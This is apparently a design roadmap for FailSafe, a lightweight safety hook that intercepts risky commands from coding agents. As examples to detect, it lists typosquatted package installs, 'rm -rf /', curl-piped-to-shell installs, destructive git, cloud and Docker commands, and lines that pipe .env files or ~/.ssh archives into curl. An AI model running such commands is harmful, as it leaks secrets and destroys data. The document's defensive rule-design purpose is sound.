# FailSafe Roadmap

FailSafe should stay small, fast, and boring in the best way. The goal is not to become a full security scanner. The goal is to catch the obvious agent disasters before they happen, especially when a developer is moving fast or running Claude Code with broad permissions.

## Product Position

FailSafe is the seatbelt for coding agents.

It should be useful because it:

- Blocks fake package installs before they reach npm or PyPI.
- Catches catastrophic shell commands like `rm -rf /`.
- Adds one last layer of protection even when normal permissions are skipped.
- Runs with zero dependencies and fails open when it cannot make a confident decision.

The promise should stay simple:

> Tiny safety hooks for the dangerous things coding agents actually do.

## Principles

- Keep the fast path instant for normal commands.
- Hard-block only near-certain danger.
- Ask on suspicious or high-blast-radius actions.
- Fail open on network errors, parser errors, and unexpected states.
- Prefer clear rules over opaque scoring.
- Avoid becoming a general SCA, SIEM, or enterprise policy engine.

## Priority 1: Finish The Current Safety Surface

These are the most important fixes because they strengthen the rules FailSafe already claims to provide.

- Keep expanding parser tests for shell syntax edge cases.
- Add tests for quoted paths, escaped spaces, command substitutions, and nested shell calls.
- Improve Windows path handling where it makes sense for Claude Code users.
- Add a few golden end-to-end hook tests that feed real `PreToolUse` JSON into `failsafe.py`.

Success looks like:

- Developers can trust the README examples.
- Known bypasses become regression tests.
- The hook stays easy to audit in one sitting.

## Priority 2: Manifest Install Protection

**Status: source manifests done (module 4).** `package.json`, `requirements.txt`
(via `pip install -r` / `uv pip install -r`), and `pyproject.toml` (PEP 621 +
poetry, via `poetry install` / `uv sync`) are now parsed on bare installs and
fed through the existing registry checks. Lockfile parsing (`package-lock.json`,
`pnpm-lock.yaml`, `yarn.lock`, `poetry.lock`, `uv.lock`) is still pending, as is
`pyproject.toml` on Python < 3.11 (no `tomllib`). See `hooks/test_manifest.py`.

Today FailSafe checks direct package arguments like:

```bash
npm install leftpad-but-fake
pip install reqeusts
npx suspicious-tool
```

It should also inspect common manifest-driven installs:

```bash
npm install
pnpm install
yarn install
bun install
pip install -r requirements.txt
poetry install
uv sync
```

Implementation idea:

- Detect manifest install commands.
- Read the relevant manifest files from the current working directory.
- Extract package names using lightweight stdlib parsing where possible.
- Reuse the existing npm and PyPI registry checks.
- Ask instead of deny when the manifest is large or ambiguous.

Files to support first:

- `package.json`
- `requirements.txt`
- `pyproject.toml`
- `uv.lock`
- `poetry.lock`
- `package-lock.json`
- `pnpm-lock.yaml`
- `yarn.lock`

Success looks like:

- An agent cannot sneak a hallucinated dependency into a manifest and then run a bare install.
- Normal lockfile installs remain low-friction.

## Priority 3: Curl Pipe Shell Guard

This is one of the most recognizable risky developer patterns:

```bash
curl https://example.com/install.sh | bash
wget -qO- https://example.com/install.sh | sh
```

Suggested behavior:

- Ask for remote script piped into `sh`, `bash`, `zsh`, or `python`.
- Deny obviously suspicious cases, such as plain HTTP into shell.
- Allow local scripts and normal downloads.

Success looks like:

- Developers get a clear pause before an agent runs remote code.
- Legit install flows are still possible with explicit approval.

## Priority 4: Git Disaster Guard

Agents use git constantly. FailSafe should protect the actions that are hard to undo.

Ask on:

- `git reset --hard`
- `git clean -fdx`
- `git push --force`
- `git push --force-with-lease`
- deleting branches
- deleting `.git`

Deny on:

- force pushing directly to protected branches like `main`, `master`, `production`, or `release`
- recursive deletion of `.git`

Success looks like:

- Agents can still do normal git work.
- Destructive repository operations require human intent.

## Priority 5: Cloud And Infra Blast Radius

This should be conservative and mostly ask-based.

Ask on:

- `terraform destroy`
- `kubectl delete namespace`
- `kubectl delete all --all`
- `docker system prune -a`
- `docker volume rm`
- `aws s3 rm ... --recursive`
- `gcloud projects delete`
- `az group delete`

Success looks like:

- FailSafe catches commands with real production blast radius.
- It does not try to understand every cloud provider deeply.

## Priority 6: Secrets Exfiltration Guard

This area is useful, but easy to make noisy. Start narrow.

Ask on:

- `.env` sent to a network command
- `~/.ssh` sent to a network command
- private key files piped into `curl`, `scp`, `rsync`, or `nc`
- archive commands that include secrets and immediately upload them

Examples:

```bash
cat .env | curl -d @- https://example.com
curl -d @.env https://example.com
tar czf - ~/.ssh | curl --data-binary @- https://example.com
```

Success looks like:

- Obvious leaks pause for approval.
- Reading a local `.env` during normal debugging is not blocked.

## Priority 7: Configuration

Developers will eventually want local control.

Possible file:

```toml
strict = false
protected_branches = ["main", "production"]
protected_paths = ["~/.ssh", ".env", "infra/prod"]
allowed_packages = ["internal-tool"]
```

Keep config optional. The zero-config path should remain excellent.

Success looks like:

- Teams can tune FailSafe without forking it.
- Solo developers can install it and forget it.

## Priority 8: Codex CLI Support

Codex (OpenAI's open-source terminal agent) uses an identical hook architecture:
PreToolUse fires before shell commands, stdin delivers JSON, and returning
`permissionDecision: "deny"` blocks the action. Config lives in `hooks.json`
or `~/.codex/config.toml`.

`failsafe.py` likely needs zero changes. Work needed:

- Install Codex CLI and compare exact stdin JSON format with Claude Code's.
- If identical: add a `codex-hooks.json` (or confirm one `hooks.json` works for both).
- If different: write a thin adapter that normalizes the input before passing to `failsafe.py`.
- Add Codex-specific end-to-end tests.
- Update README install instructions for both agents.

Known limitation: Codex's own docs say PreToolUse "doesn't intercept all shell
calls yet, only the simple ones" — coverage will be lower than Claude Code until
Codex matures.

Success looks like:

- One `failsafe.py`, two agents protected.
- Install instructions for Claude Code and Codex side by side.

## Priority 9: More Ecosystems

Add registries only when the parser and reputation checks can stay simple.

Good candidates:

- crates.io
- Go modules
- RubyGems
- Maven Central
- Docker Hub images

Success looks like:

- Each ecosystem has focused tests.
- No ecosystem adds heavy dependencies.

## Promotion Readiness Checklist

Before a serious public launch:

- Add a short demo GIF or video to the README.
- Make install instructions copy-paste simple.
- Add a section called "What FailSafe will not do".
- Add a few real examples of blocked commands.
- Add contribution notes for new rules and tests.
- Tag the repository with useful GitHub topics.

Good launch framing:

> FailSafe is a tiny Claude Code plugin that blocks fake package installs and catastrophic shell commands before an agent runs them.

Avoid framing it as:

- a complete security platform
- malware detection
- enterprise compliance
- a replacement for dependency scanners

## Not Now

These ideas are interesting, but should wait:

- Machine learning based risk scoring.
- Paid hosted service.
- Full dependency vulnerability scanning.
- Deep static analysis.
- Huge maintained blocklists.
- A UI before the hook itself is excellent.

## Next Best Step

Source-manifest install protection is built (module 4). Next: either extend it
to lockfiles, or move to Priority 3 (curl-pipe-shell guard). Lockfile parsing
closes the remaining manifest gap but needs a YAML strategy; the curl-pipe guard
is self-contained and high-recognition.
